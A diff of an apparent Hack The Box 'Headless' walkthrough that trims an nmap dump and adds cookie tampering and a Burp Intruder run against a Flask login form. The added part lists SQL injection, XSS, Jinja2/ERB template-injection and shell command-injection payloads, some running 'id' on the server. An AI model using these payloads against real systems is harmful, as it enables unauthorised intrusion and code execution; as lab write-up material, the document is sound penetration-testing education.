@@ -98,44 +98,16 @@ PORT     STATE SERVICE VERSION
 SF-Port5000-TCP:V=7.92%I=7%D=5/27%Time=6654D741%P=aarch64-unknown-linux-gn
 SF:u%r(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\
 SF:.2\x20Python/3\.11\.2\r\nDate:\x20Mon,\x2027\x20May\x202024\x2018:56:01
-SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
-SF:th:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnv
-SF:B_Zfs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<ht
-SF:ml\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">
-SF:\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-
-SF:width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Constr
-SF:uction</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x
-SF:20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-famil
-SF:y:\x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
-SF:\x20\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20
-SF:\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
-SF:\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0display:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20jus
-SF:tify-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
-SF:x20align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\x20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x
-SF:20\x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x
-SF:20\x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\
-SF:x20\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\
-SF:x200,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOC
-SF:TYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\
-SF:x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x2
-SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
-SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
-SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
-SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
-SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
-SF:or\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20o
-SF:r\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
+.
+.Truncated output
+.
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 95.74 seconds
 
 ```
-We see SSH (OpenSSH 9.2p1 Debian 2+deb12u2), but we don't have any credentials to connect yet and recent versions of openSSH are generally well secured.\\
+We see SSH (OpenSSH 9.2p1 Debian 2+deb12u2), but we don't have any credentials to connect yet and recent versions of openSSH are well secured.\\
 There is also something running on port 5000, which is identified as "Werkzeug". I already saw that running in <a href="/_walkthroughs/ScriptKiddie" target="_blank">ScriptKiddie</a>. To recall, Werkzeug is a utility framework for Python (it is often used with Flask). Here, it's the version 2.2.2 and it uses Python 3.11.2.\\
 Finally, we see in the HTTP response a header "Set-Cookie" with the value **is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs**. This could be an encrypted user session, so we have to keep that in mind.
 
@@ -160,6 +132,7 @@ Before trying anything with this formular, let's launch a *dirb* scan to search 
 sudo dirb http://10.10.11.8:5000 -r
 sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.8:5000 -H "Host: FUZZ.10.10.11.8:5000" -fs 2799
 ```
+*Ffuf* didn't find any subdomain.\\
 *Dirb* found 2 directories:
 
 - http://10.10.11.8:5000/support (CODE:200\|SIZE:2363): this is the formular shown in the image above.
@@ -169,7 +142,13 @@ sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ![dashboard]({{https://jsom1.github.io/}}/_images/htb_headless_dash.png){: height="80px" width = "420px"}
 </div>
 
-This is interesting, because it is very likely linked to the cookie we saw in the header. *Ffuf* didn't find any subdomain, so we only have 3 leads now: the formular, this error message, and potentially the version of Werkzeug. Let's dig into the error message and try to modify the cookie. To do that, we could install a Firefox extension (a cookie manager), but we should also be able to do it from the menu -> Web developer -> Storage Inspector. The idea is to modify the cookie with the value we found, that is "InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs". Then, we refresh the page to see if it worked.\\
+This is interesting, because it is very likely linked to the cookie we saw in the header. so we have 3 leads now: 
+
+- The formular, which might be vulnerable to injections such as XSS, SQLi, and so on
+- The cookie and this error message
+- Werkzeug itself
+
+Let's start by digging into the error message and try to modify the cookie. To do that, we could install a Firefox extension (a cookie manager), but we should also be able to do it from the menu -> Web developer -> Storage Inspector. The idea is to modify the cookie with the value we found, that is "InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs". Then, we refresh the page to see if it worked.\\
 Unfortunately, as we see in the image below, it is already the cookie being used.
 
 <div class="img_container">
@@ -194,21 +173,74 @@ This returns "YWRtaW4=", which we replace in the cookie. The new cookie is "YWRt
 ![dashboard]({{https://jsom1.github.io/}}/_images/htb_headless_cookie2.png){: height="300px" width = "400px"}
 </div>
 
-It doesn't work... We see the parsed value on the right is not the same anymore. It was an array previously, whereas it is an object now. I tried removing the "=" from "YWRtaW4=" (it's called *URL-safe encoding* (base64URL format)), and it's recognized as an array once again. However, the error message is still the same.
+It doesn't work... We see the parsed value on the right is not the same anymore. It was an array previously, whereas it is an object now. I tried removing the "=" from "YWRtaW4=" (it's called *URL-safe encoding* (base64URL format)), and it's recognized as an array once again. However, the error message is still the same... Let's leave it aside for the moment, and have a look at the formular.
 
+In particular, let's try a few injections. We fill the formular as follows:
 
+<div class="img_container">
+![form2]({{https://jsom1.github.io/}}/_images/htb_headless_form2.png){: height="400px" width = "420px"}
+</div>
 
+In the "First Name" field, we try a SQL injection (other payloads: *test' UNION SELECT NULL, NULL, NULL --*, *test' AND 1=1 --*, and so on).\\
+In the "Last Name" field, we try a XSS injection (other payloads: *"><img src=x onerror=alert('XSS')>*, and so on).\\
+In the "Email" field, I use my email adress to see the answer.\\
+In the "Phone Number" and "Message" fields, we try two command injections.
 
+Before pressing "Submit", we set up a proxy and start Burp to intercept the request. This way, we will be able to easily try other payloads. Here's the intercepted request:
 
+<div class="img_container">
+![burpreq]({{https://jsom1.github.io/}}/_images/htb_headless_burpreq.png){: height="200px" width = "400px"}
+</div>
 
+We see the exact parameter names, as well as the cookie. We can forward the request to see how the server responds: nothing stands out. We get a "HTTP/1.1 200 OK", but nothing happened in the output. The server treated our request without raising any error or message regarding our injection attempt.\\
+However, I could have something in my mail, so let's check that. Well, I didn't receive any mail. Let's send the request to Burp's Intruder. In the "Positions" tab, we select the "Sniper" attack type. We see the cookie is also highlighted in green, which means Burp will replace its value with a payload. I don't think we want that, because the request might not work anymore then. So, we "Clear §" (on the right), and then only highlight the request's parameters. Once this is done, we go to the "Payloads" tab. There, we provide a custom list of payloads to try. The list is called *headless_runtime.txt* and contains de following payloads:
 
-Recherchez des vulnérabilités connues pour Werkzeug ou des applications Flask non sécurisées.
-Vérifiez si des paramètres de débogage sont activés, ce qui pourrait permettre l'exécution de code à distance.
-Injection et Manipulation de Paramètres
+```
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+') OR ('1'='1' -- 
+' OR '1'='1' -- 
+' OR '1'='1' /* 
+') OR '1'='1' /* 
+' OR 1=1--
+") OR 1=1--
+') OR 1=1--
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+"><img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><svg onload=alert('XSS')>
+<iframe src="javascript:alert('XSS');"></iframe>
+"><iframe src="javascript:alert('XSS');"></iframe>
+'><svg onload=alert('XSS')>
+"><svg onload=alert('XSS')>
+{{7*7}}
+{{config.items()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{_self.env.global}}
+{{_self.env.global['app'].request.server['SERVER_SOFTWARE']}}
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+; id
+| id
+&& id
+|| id
+$(id)
+`id`
+```
 
-Testez les points d'entrée de l'application pour les vulnérabilités d'injection comme SSTI (Server-Side Template Injection) ou d'autres injections courantes.
-Conclusion
-Le port 5000 héberge une application web basée sur Flask avec Werkzeug comme serveur. Le cookie et la réponse HTTP initiale suggèrent qu'il pourrait y avoir des points d'entrée intéressants pour des tests de sécurité supplémentaires. Accédez à l'application, inspectez le cookie, et utilisez des outils de fuzzing pour découvrir d'autres points d'entrée possibles.
+Some of these payloads are for detecting an SSTI vulnerability (such as *{{7\*7}}* and *{{config.items()}}*. This is because Werkzeug is often used with Flask, a framework for web development with Python. In turn, Flask uses *Jinja2* as template engine, and this latter might be vulnerable to SSTI injection.\\
+We're ready to click on "Start attack". The attacks tries every payload above in every possible positions. That means it's sending 34 \* 5 = 170 requests. Here's the result, and we're looking for anything unexpected (status or length):
+
+<div class="img_container">
+![intruder]({{https://jsom1.github.io/}}/_images/htb_headless_intruder.png){: height="420px" width = "400px"}
+</div>
+
+As we see in the image above, the length changes between payloads 147 and 165. Those payloads are the ones testing for an XSS vulnerability (147-156) as well as an SSTI vulnerability (157-164). They triggered the message "*Hacking Attempt Detected. Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation*". Well, sending 170 requests was not that discrete...
+
 
 
 
